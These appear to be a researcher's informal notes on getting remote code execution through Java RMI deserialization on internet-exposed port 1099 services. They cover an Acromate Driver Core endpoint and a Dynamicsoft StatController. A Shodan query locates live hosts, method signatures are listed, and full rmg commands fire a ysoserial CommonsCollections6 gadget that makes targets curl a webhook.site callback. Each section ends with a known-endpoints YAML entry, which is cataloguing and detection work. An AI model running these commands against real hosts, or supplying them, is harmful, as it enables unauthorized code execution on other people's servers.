ok rmi, java and unserialize stuff are cool after all, it took time to enjoy.. (thx amine :) )

most of 1099 port exposed on the internet expose jmxrmi, the exploitation is straightforward with beanshooter https://github.com/qtc-de/beanshooter, but what if there isn't...

and here we are, looking for methods in random package with rmg https://github.com/qtc-de/remote-method-guesser on rmi exposed on internet, i'll try to describe those which i manage to get an actual RCE gadget (URLDNS is cool but for test only)


1-------------------------------------------------------------------------------------------------------------------------------------------------
https://www.shodan.io/search?query=http.html_hash%3A516997337 (only few hosts on korea)

IDataObject
com.acromate.driver.core.DataObjectImpl_Stub

method discovered :
String register(String dummy, String dummy2)
String login(String dummy, String dummy2)
String logout(String dummy)

then i got the jar :)

void freeStatement(String var1, IDataStatement var2)  
IDataStatement allocStatement(String var1)  
IDataStatement allocStatement(String var1, String var2)  
IDataStatement allocStatementEMS(String var1, int var2)  
Object reqPacket(String var1, String var2, Object... var3)  
Object rptPacket(String var1, String var2, Object... var3)  
Object cmdPacket(String var1, String var2, Object... var3)  
IClassObject getSystem(String var1, String var2)  
IClassObject getGroups(String var1)  
IClassObject getGroup(String var1, String var2)  
String getGroupScript(String var1, String var2)  
int setGroupScript(String var1, String var2, String var3)  
String getNonce(String var1)  
String getClientAddress()  
String login(String var1, String var2)  
String logout(String var1)  
String register(String var1, String var2)  
int getPermitLevel(String var1)  
String getPermitGroup(String var1)  
int setUserLogOutForcibly(String var1)  
Object callMethod(String var1, String var2, String var3, Object... var4)  
int setParam(String var1, String var2, String var3)  
String getParam(String var1, String var2)  
IClassObject getFieldObject(String var1, String var2)  


java -jar rmg-5.1.0-jar-with-dependencies.jar serial xxx 1099 CommonsCollections6 'curl -X POST http://webhook.site/xx/' --signature 'String register(String dummy, String dummy2)' --bound-name IDataObject --yso /root/Desktop/yso/ysoserial-all.jar


--------------------------------------------- to RMG remote-method-guesser/resources/known-endpoints/known-endpoints.yml (https://github.com/qtc-de/remote-method-guesser/blob/3398ec6abc0af18c71c1f90b0c85702469eabf75/resources/known-endpoints/known-endpoints.yml)

- name: Acromate Driver Core
  className:
    - com.acromate.driver.core.DataObjectImpl_Stub

  description: |
    stuff
    
  remoteMethods:
    - String register(String dummy, String dummy2)
    - String login(String dummy, String dummy2)
    - String logout(String dummy)

  vulnerabilities:
 
    - name: Deserialization
      description: |
       Several methods accept non trivial parameters and can therefore be used for deserialization attacks.
      references:
        - https://github.com/qtc-de/remote-method-guesser#serial


2-------------------------------------------------------------------------------------------------------------------------------------------------



com.dynamicsoft.DsLibs.mgmt.statistics.StatController
com.dynamicsoft.DsLibs.mgmt.statistics.StatController

method discovered :
boolean reset(String dummy)
boolean reset(String dummy, String dummy2[])


java -jar rmg-5.1.0-jar-with-dependencies.jar serial xxxx 1099 CommonsCollections6 "curl https://webhook.site/xxx" --signature 'boolean reset(String dummy)' --yso /root/Desktop/yso/ysoserial-all.jar --bound-name "com.dynamicsoft.DsLibs.mgmt.statistics.StatController"


- name: Dynamicsoft MGMT StatController
  className:
    - com.dynamicsoft.DsLibs.mgmt.statistics.StatController
  description: |
    stuff
    
  remoteMethods:
    - boolean reset(String dummy)
    - boolean reset(String dummy, String dummy2[])

  vulnerabilities:
 
    - name: Deserialization
      description: |
     Several methods accept non trivial parameters and can therefore be used for deserialization attacks.
      references:
        - https://github.com/qtc-de/remote-method-guesser#serial

